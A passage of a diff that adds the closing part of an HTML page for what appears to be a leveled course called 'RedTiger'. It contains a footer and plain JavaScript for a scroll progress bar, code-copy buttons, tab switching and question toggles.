+    </div>
+    <div class="footer-right">
+      RedTiger · <span>Level 1 / 10</span>
+    </div>
+  </div>
+
+</div><!-- end container -->
+
+<script>
+  // Progress bar on scroll
+  window.addEventListener('scroll', () => {
+    const scrollTop = window.scrollY;
+    const docHeight = document.body.scrollHeight - window.innerHeight;
+    const progress = (scrollTop / docHeight) * 100;
+    document.getElementById('progressBar').style.width = progress + '%';
+  });
+
+  // Copy button
+  function copyCode(btn, text) {
+    const toCopy = text || btn.closest('.code-block').querySelector('pre').innerText;
+    navigator.clipboard.writeText(toCopy).then(() => {
+      btn.textContent = 'COPIED';
+      btn.classList.add('copied');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    });
+  }
+
+  // Tab switching
+  function switchTab(btn, targetId) {
+    const group = btn.closest('.tab-group');
+    group.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    group.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById(targetId).classList.add('active');
+  }
+
+  // Question toggle
+  function toggleQ(el) {
+    el.classList.toggle('open');
+  }
+</script>
+</body>
+</html>
